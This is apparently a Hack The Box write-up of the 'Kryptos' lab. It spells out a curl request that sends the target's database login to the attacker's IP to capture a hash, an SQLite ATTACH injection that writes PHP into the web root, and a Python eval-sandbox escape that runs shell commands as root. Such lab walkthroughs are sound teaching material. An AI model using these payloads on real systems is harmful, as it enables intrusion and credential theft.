+++
author = "Nick"
categories = ["CTF", "python", "cryptography", "custom exploitation", "PHP", "mysql", "mariadb", "php filters", "eval", "RCE", "dirb", "hack the box", "Linux", "hashcat", "wireshark"]
date = 2019-09-21T00:48:20Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2019/09/info.PNG"
slug = "hack-the-box-kryptos"
summary = "Probably the hardest box to ever show up on HTB? Lets find out and walkthough Kryptos!"
tags = ["CTF", "python", "cryptography", "custom exploitation", "PHP", "mysql", "mariadb", "php filters", "eval", "RCE", "dirb", "hack the box", "Linux", "hashcat", "wireshark"]
title = "Hack The Box - Kryptos"

+++


Welcome back! This time we are doing the Kryptos machine. This box is listed as insane level of difficulty, so let's see what it has in store!

As usual we start with our standard nmap scan: ```nmap -sC -sV -oA 10.10.10.129```. Our results are pretty limited.

```
Nmap scan report for 10.10.10.129
Host is up (0.056s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2c:b3:7e:10:fa:91:f3:6c:4a:cc:d7:f4:88:0f:08:90 (RSA)
|   256 0c:cd:47:2b:96:a2:50:5e:99:bf:bd:d0:de:05:5d:ed (ECDSA)
|_  256 e6:5a:cb:c8:dc:be:06:04:cf:db:3a:96:e7:5a:d5:aa (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cryptor Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.73 seconds
```

So we'll repeat the scan but against all ports: ```nmap -sC -sV -T4 -p- -oA 10.10.10.129```. The same results come back.

Lets head over to port 80 and see what is being served.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-32.png" caption="A login page." >}}

We will setup a `dirb` on the URL and see what comes back. While it runs, we take a look at the source of the page and see its fairly simple as well. We do see a token value that seems to change on every submission (tied to the cookie?). The standard passwords didn't work either. If we look at the request in Burpsuite we see the request being sent to a database called Cryptor.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-33.png" >}}

We can actually modify this request in a ```curl``` command and append a command injection to see if it's vulnerable to this method. We need to create a database running on our machine first. 

```services mysql start``` then we launch ```mariadb``` or whatever you might want to use. We issue ```create database cryptor``` in mariadb to get a database started. We then need to edit the ```50-server.cnf``` file to ensure we allow our database to be seen externally. 

```nano /etc/mysql/mariadb.conf.d/50-server-cnf```

Locate the bind-address and set it to ```0.0.0.0```.

We will use Metasploit to try and capture the request. We will use ```auxiliary/server/capture/mysql```. In this case we will only require the  ```JOHNPWFILE``` option. We want to snag the hash and crack it. We start the listener then craft a ```curl``` command to authenticate.

```
curl -X POST http://10.10.10.129 -b "PHPSESSID=p5g6j9caioo3qf8ian1ku9krmb" -d "username=Love&password=Password&db=cryptor;host=10.10.14.235;port=3306&token=b6feac8f9b4d6ef64c75d160a31d40272d171c4d1fa488c1f02882b6cb51968c&login="
```

We then see our Metasploit listener light up and obtain our hash.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-34.png" >}}

We can now feed this into Hashcat for cracking!

{{< figure src="__GHOST_URL__/content/images/2019/09/image-35.png" caption="Cracking done on a Windows machine." >}}

Now we wait...

{{< figure src="__GHOST_URL__/content/images/2019/09/image-36.png" >}}

We have a password! We now have the username of dbuser and a password of krypton1te. So now we will create a local database on our local machine with the same name as our target, cryptor. In this case, I chose to make the privileges available to only that DB user from the IP with this password.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-37.png" >}}

Now we need understand the database structure of the target machine. So for this we need to do some Wireshark action. We will use the same method as above and craft an injected curl command and see what the wire shows.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-38.png" caption="We get a password back, encrypted it seems." >}}

We see that the call is to a table called 'users'. So now we have a table. We need to figure out what kind of hashing is done on the passwords. A quick copy paste into TunnelsUp gives us an MD5 hash. So now that we have table and column structure, we need to recreate that locally as well. Once that is done, we will call our command injection again via Burpsuite and we should see a valid submission! We have to edit our token and cookie quite a few times until it finally worked for me, but it worked!

{{< figure src="__GHOST_URL__/content/images/2019/09/image-39.png" >}}

We are greeted with the above page. Seemingly encrypts a file type. We have the option of AES-CBC and RC4. RC4 is a Xor algorithm. That means if you can have the following scenarios:

* Plaintext XOR Ciphertext will give us the key.
* Plaintext XOR Key will give us the Ciphertext.
* Ciphertext XOR Key will give us the Plaintext.

Now I'm just going to assume that it's using a static key to do the RC4. To test this we make a file called original.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-40.png" >}}

Now host the file for the encyption page via ```SimpleHTTPServer```. We get a value.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-41.png" >}}

Now we can take that value and encrypt it AGAIN and save that.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-42.png" >}}

Now give that file to the encryption page as well.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-43.png" >}}

So following how XOR encryption works, we should be able to decrypt this string and get our starting value.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-44.png" >}}

Sure enough we can! So it is using a static key. You can also use this technique as a form of LFI. So using this method, we can start to get the contents of the directories from the `dirbuster` enumeration. The dev directory in particular. The first guess was index.html which yielded nothing. The next is index.php.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-45.png" >}}

After following the above method (which I should have scripted...), we are able to see the contents of index.php inside /dev/!

{{< figure src="__GHOST_URL__/content/images/2019/09/image-46.png" >}}

We see there are 2 additional links. We repeat the process for those pages as well. We see that there is a need to remove the sqlite_test_page.php. Well, lets get that page using the same method.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-47.png" >}}

Nothing here. Seems that the content might be hidden or just blank. If it is hidden we can use a [PHP filter or wrapper](https://highon.coffee/blog/lfi-cheat-sheet/#php-wrapper-phpfilter) to encode the content to base64. So our URL will look like this:

{{< figure src="__GHOST_URL__/content/images/2019/09/image-48.png" >}}

We see at the bottom of the file another base64 encoded block.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-49.png" >}}

We decode it and we have the following:

{{< figure src="__GHOST_URL__/content/images/2019/09/image-50.png" >}}

It looks like this code is used to lookup books by ID. What's great for us is that it seems that `bookid` is injectable. Searching around lead me to [this resource](https://github.com/s0wr0b1ndef/PayloadsAllTheThings/blob/master/SQL%20injection/SQLite%20Injection.md). It seems that we can attach to a file as a database as a form of RCE. So first we need to craft our command, Burpsuite is useful for this.

Our crafted command looks like this:
```
1 or 1=1;attach databse ‘/var/www/html/dev/d9e28afcf0b274a5e0542abb67db0784/love.php’ as Hello; CREATE TABLE love.pwn (dayta text);
INSERT INTO love.pwn (dayta) VALUES ("<?php echo '<p>Hello World</p>'; ?>");--"
```
Which has been URL encoded to this:
```
http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE&bookid=%31%20%6f%72%20%31%3d%31%3b%61%74%74%61%63%68%20%64%61%74%61%62%61%73%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%64%65%76%2f%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%6c%6f%76%65%2e%70%68%70%27%20%61%73%20%6c%6f%76%65%3b%63%72%65%61%74%65%20%74%61%62%6c%65%20%6c%6f%76%65%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%69%6e%73%65%72%74%20%69%6e%74%6f%20%6c%6f%76%65%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%76%61%6c%75%65%73%20%28%22%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e%22%29%3b%2d%2d
```

We use burp to inject it and we can use the Xor method to get that page content.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-52.png" >}}

Well that concept worked, so now we can do one of two things. Create a payload with MSFPC or use built in PHP functions, `scandir` and `get_file_contents`, to enumerate. I don't really want to PHP filter anymore to get code on the box, so we'll use the enumeration option.

We can use ```<?php print_r(scandir('/home/')); ?>``` in our command to get the contents of the directory.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-53.png" >}}

We get back one user, rijndael. Lets do this again to get that users folder content as well.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-54.png" >}}

We see that we have quite a few things here for us to get. Trying to get the content of user.txt fails... of course. We try to get creds.txt and they seem to be a Vim encrypted file.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-55.png" >}}

We will try to take a peek at creds.old as well.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-56.png" >}}

Well then that's no good for us. When we look at the cred.txt file we see it says VimCrypt~02!. Given the documentation we either have pkzip, blowfish or blowfish2 encryption. [This article](https://dgl.cx/2014/10/vim-blowfish) suggests that its blowfish. Guess what, that's another Xor cipher! Luckily someone has done this for us, [vimdecrypt.py](https://github.com/nlitsme/vimdecrypt). Using the script we get back the combo of `rijndael` and `bkVBL8Q9HuBSpj`. We might be able to leverage that SSH port now.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-57.png" caption="It works, we are in!" >}}

Finally. User. Damn. Onto root!

Now that we are on the system, lets look around. We saw before that there was a directory called kryptos. Inside it we find a python script, kryptos.py.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-58.png" >}}

Immediately at looking at the script we see the eval function being called. We know that this is something we can leverage, however it does list builtins as ```None``` which slows us down. The script does three things, ```GET /```, ```GET /debug``` and ```POST /eval``` running on its self-created server on ```port 81```. We can check to see if this is running by using ```netstat```.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-59.png" >}}

It is running and as root. So in order to exploit this we need to exploit the ```eval``` function. We also need to exploit the the signature function, ```secure_rng```, because they need to match in order for code to function. If you copy the code locally and make some changes to the ```secure_rng``` function, we can see that the seed pool is has some repeating characters, meaning its a fairly small pool. We can try and repeat until our keys match up, in a brute force attempt. 

We can use a simple ```while``` statement to keep the loop going and parse the responses with the ```response``` library. We have some pseudo code that looks like this:
```
result = "no dice"
attempts = 0
expr = malicous_code_here

while result == 'no dice':
    seed = random.getrandbits(128)
    rand = secure_rng(seed)
    attempts = attempts + 1
    signature = sign(expr)
    req = requests.post('http://127.0.0.1:81/eval', json={'expr': expr, 'sig': sig})
print 'Success'
```

Now that we know that the signature can be matched up, we need to look at exploiting the ```eval``` function. Normally, when the ```eval``` function is called with ```Builtin functions``` set to ```None```. It prohibits the standard escalation technique. However [this resource](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html) says otherwise. We will use this line of code instead so that we can copy the root.txt file out.

```
expr = "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('cp /root/root.txt /tmp/1 && chmod 777 /tmp/1')"
```

We can then combine the copy of the kryptos.py we took from the target machine and replicated the signature function to match itself, append what we've learned about ```eval``` function and get our ```root.txt``` with some clever port forwarding.

We forward our port locally to remote port 81: ```ssh -L 81:localhost:81 rijndael@10.10.10.129```. Once that is done, we run our modified kryptos.py script and wait fro the file ```1``` to show up in the ```/tmp/``` directory.

{{< figure src="__GHOST_URL__/content/images/2019/09/image-61.png" >}}

We did it. We have the root flag! I hope you enjoyed this box as much as I did.

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

